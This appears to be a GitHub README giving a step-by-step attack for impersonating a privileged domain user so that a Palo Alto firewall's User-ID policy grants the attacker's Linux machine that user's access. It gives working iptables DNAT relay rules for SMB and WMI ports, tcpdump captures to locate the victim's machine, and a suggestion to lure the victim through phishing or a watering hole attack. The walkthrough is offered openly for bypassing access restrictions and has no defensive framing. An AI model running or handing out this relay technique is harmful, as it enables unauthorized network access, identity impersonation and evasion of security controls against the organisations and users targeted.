# IMU
Acquiring another identity to get through Palo Alto User-ID security policies.

If you are unable to access certain websites because they are restricted to a limited class of user then you can use this technique to gain access.  The steps described here allow an attacking Linux machine to impersonate another user's identity and trick a Palo Alto firewall into granting you access through a security policy.  The user's password is never recovered in this example; the method relies completely on relaying Windows protocols (WMI RPC and NetBIOS probes).

**The following diagram can be used to understand the scenario**<br />
![alt text](https://github.com/billchaison/IMU/blob/master/uidv.png)

**It is assumed that you have already accomplished the following**<br />
* Identified a privileged user (B).  You do not need to know the IP address of his machine at this point.
* Have network access from your attacking Linux machine (C).  The interface in this example is eth0.
* Know the IP address of a domain controller (D).

**Stage the attack**<br />
Enable routing on (C).<br />
`echo 1 > /proc/sys/net/ipv4/conf/eth0/forwarding`<br />
`echo 1 > /proc/sys/net/ipv4/ip_forward`

Configure relay on (C) to get an authentication event on (D).  First ensure that you do not have ports 135 and 445 listening on your attacking Linux machine.<br />
`iptables -t nat -A POSTROUTING -t nat -j MASQUERADE`<br />
`iptables -t nat -A PREROUTING -p tcp -i eth0 --dport 445 -j DNAT --to-destination 10.0.111.10`

Start tcpdump on (C) to record the IP address of the machine (B) that VPRISKY is logged in to.<br />
`tcpdump -nn -vv -i eth0 port 445`

By some means (phishing, watering hole attack, ... whatever) get VPRISKY to visit a CIFS share on (C).  The request will be relayed to (D).<br />
`\\10.30.66.77\SYSVOL`<br />
The share name does not have to be valid on (D).  If it is not a valid share name the authentication will still take place but an access denied error will be returned to (B).

Once VPRISKY has relayed SMB traffic through (C) to (D) and you have observed the IP address for (B) then you need to stop tcpdump, tear down the iptables NAT rules and add the following new NAT rules.  The new rules will ensure that WMI and SMB probes coming from the management interface IP on (A) to your attacking machine (C) will be relayed to (B).  This leads the firewall (A) to think that VPRISKY is logged in to (C).<br />
`iptables -F -t nat`<br />
`iptables -t nat -A POSTROUTING -t nat -j MASQUERADE`<br />
`iptables -t nat -A PREROUTING -p tcp -i eth0 --dport 135 -j DNAT --to-destination 10.20.101.141`<br />
`iptables -t nat -A PREROUTING -p tcp -i eth0 --dport 445 -j DNAT --to-destination 10.20.101.141`

You may wish to monitor WMI and SMB packets on eth0 coming from the firewall's management IP address (A).<br />
`tcpdump -nn -vv -i eth0 port 135 or port 445`<br />
If you don't already know the IP address of the Palo Alto's management interface, now you do ... have fun with that.

**Accessing the internet**<br />
At this point the IP address of your attacking machine (C) appears to be used by VPRISKY.  The traffic monitor logs on (A) will show traffic from 10.30.66.77 as coming from CORP\VPRISKY.
